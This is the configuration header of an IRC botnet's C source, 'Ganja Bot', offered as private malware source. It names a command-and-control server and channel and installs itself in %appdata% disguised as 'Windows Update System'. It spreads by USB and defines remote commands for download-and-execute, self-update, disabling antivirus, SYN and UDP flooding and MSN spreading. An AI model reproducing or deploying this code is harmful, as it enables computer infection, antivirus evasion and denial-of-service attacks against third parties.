//////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////Ganja Bot//////////////////////////////////////
////////////////////////////Coded by HaVoK & PhobiiA///////////////////////////////
/////////////////////////////Highly private source////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////
ircconnect_s ircconnect[] =
{
	{"phobiia.dyndns.info", 6667, ""},
	{NULL, NULL, NULL}
};

/* Reconnect Config */
unsigned long cfg_reconnectsleep = 3000; // msec 
unsigned long cfg_ircmaxwaittime = 600; // sec
BOOL _inject = 1;
/* IRC Config */
char cfg_ircchannel[] = "#Ganja";
char cfg_infochan[] = "#Ganja";
char cfg_irchost[] = "PhobiiA";
char cfg_ircchanpass[] = "";
char cfg_ircorderprefix[] = "!";


/* Executable Config */
char cfg_mutex[]            = "TTURJEJDKDF62432DJASDJSDMSDL";
char cfg_gotopth[]          = "%appdata%";
char cfg_filename[]         = "hidserv.exe";
char cfg_regname[]          = "Windows Update System";
char USB_STR_FILENAME[]		= "DataBlock.exe";

/* Commands */ 
char cmd_silent[]     = "silent"; 	  	  
char cmd_join[]       = "join";
char cmd_part[]       = "part";
char cmd_download[]   = "dl";     
char cmd_remove[]     = "die";
char cmd_update[]     = "update";
char cmd_botkill[]	  = "clean";
char cmd_visit[]	  = "visit";
char cmd_speedtest[]  = "speedtest";
char cmd_ssyn[]		  = "ssyn";
char cmd_msn[]		  = "msn";
char cmd_unsort[]	  = "unsort";
char cmd_sort[]		  = "sort";
char cmd_avk[]		  = "KillAv";
char cmd_udp[] = "udp";

/* DL crap */
char Download_Target[MAX_LINE];
char Download_URL[MAX_LINE];
char fromchan[MAX_LINE] = "";
char szUDP_Host[MAX_LINE];
int szUDP_Port;
int szUDP_Time;
int szUDP_Delay;


char string_nick[] = "NICK";
char string_join[] = "JOIN";
char string_part[] = "PART";
char string_quit[] = "QUIT";
char string_pass[] = "PASS";
char string_ping[] = "PING";
char string_pong[] = "PONG";
char string_user[] = "USER";
char string_privmsg[] = "PRIVMSG";

///Title stuff//The\0030number shit is for colors
char title_download[] = "[Download]:";
char title_main[] = "[Main]:";
char title_update[] = "[Update]:";